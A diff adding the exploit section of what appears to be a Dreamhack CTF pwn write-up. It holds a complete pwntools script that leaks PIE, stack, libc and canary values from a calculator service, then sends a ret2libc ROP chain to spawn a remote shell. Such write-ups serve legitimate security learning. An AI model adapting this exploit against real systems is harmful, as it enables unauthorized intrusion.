@@ -21,3 +21,86 @@
 
 # Exploit
 
+```python
+from pwn import *
+from tqdm import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+p = remote('host1.dreamhack.games', 20130)
+#p = process('./prob2')
+l = ELF('./libc.so.6')
+
+breaknum = (1 << 64) + 1
+
+def calc(base : int, inputs : list):
+    p.sendlineafter(b'Base: ', str(base).encode())
+    for i in inputs:
+        if type(i) == int : 
+            if i > (1 << 64) : break
+            else : i = str(i).encode()
+        p.sendline(i)
+    p.recvuntil(b'Value: ')
+    return p.recvline()[:-1]
+
+sum1 = int(calc((1 << 56) + 1, [b'+', -1, breaknum]))
+sum2 = int(calc((1 << 56) + 1, [-1, breaknum]))
+sum1 += 1 << 64
+pie_base = sum1 - sum2 - 0x4020
+pie_base &= 0xffffffffffff
+print(hex(sum1))
+print(hex(sum2))
+print(hex(pie_base))
+print()
+
+st1 = int(calc((1 << 56), [-1, breaknum]))
+st1 = (st1 & ((1 << 48) - 1))
+st2 = st1 - (0x7fffffffc778 - 0x7fffffffc6a0)
+st3 = st1 - (0x7fffffffc778 - 0x7fffffffc6f0)
+st4 = st1 - (0x7fffffffc778 - 0x7fffffffc650)
+st5 = st1
+print(hex(st1))
+print(hex(st2))
+print(hex(st3))
+print(hex(st4))
+print(hex(st5))
+print()
+
+b = int(calc((1 << 63) + (1 << 8), [-1, breaknum]))
+b -= st1
+b >>= 8
+b -= st2
+b >>= 8
+l.address = b & 0xff
+b >>= 8
+b -= st3 & 0xffffffff
+l.address += (b & 0xff) << 8
+b >>= 8
+b -= (pie_base + 0x158e) & 0xffffff
+l.address += (b & 0xff) << 16
+b >>= 8
+b -= st4 & 0xffff
+l.address += (b & 0xffff) << 24
+l.address += 0x7f0000000000
+l.address = l.address - (0x7ffff7dd51ca - 0x7ffff7dab000)
+print(hex(l.address))
+
+c = int(calc((1 << 64) - 1, [-1, breaknum]))
+nocanaryc = st1 + pie_base + 0x158e + l.address + (0x7ffff7dd51ca - 0x7ffff7dab000)
+nocanaryc += (1 << 64) * 4
+nocanaryc -= st2 + st3 + st4 + st5
+nocanaryc &= (1 << 64) - 1
+c += 1 << 64
+canary = c - nocanaryc
+canary &= (1 << 64) - 1
+print(hex(canary))
+
+system = l.sym['system']
+binsh = list(l.search(b'/bin/sh'))[0]
+pop_rdi = l.address + 0x000000000010f75b
+ret = l.address + 0x000000000002e81b
+
+#gdb.attach(p, "b* calc+217\nc")
+int(calc((1 << 64) - 1, [0, 0, 0, 0, 0, 0, 0, 0, 0, canary, 0, ret, pop_rdi, binsh, system, 0]))
+p.interactive()
+```
